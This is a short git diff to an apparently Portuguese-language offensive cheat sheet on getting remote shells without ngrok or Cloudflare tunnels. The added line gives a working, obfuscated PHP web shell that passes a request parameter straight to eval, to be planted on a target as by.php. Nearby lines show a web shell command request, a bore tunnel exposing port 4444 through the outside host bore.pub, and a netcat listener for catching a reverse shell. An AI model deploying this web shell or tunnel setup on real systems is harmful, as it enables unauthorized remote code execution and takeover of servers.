@@ -111,6 +111,7 @@ curl "http://example.com/shell.php?cmd=whoami"
 ---
 ### Sem usar a bomba do ngrok e a bomba do clouflare exemplo real que validei
 
+- web shell no alvo chamado by.php com o conteudo `<?php class GI7Pl14V { public function __construct($H8Jy7){ @eval("/*Z#£¤h*u@!hJ2v689U02*/".$H8Jy7."/*Z#£¤h*u@!hJ2v689U02*/"); }}new GI7Pl14V($_REQUEST['pass']);?>`
 - bore local 4444 --to bore.pub  # Ou bore tld (custom domínio)
 - (ele vai fornecer algo como bore.pub:24966)
 - nc -lvnp 4444  # Porta do bore local
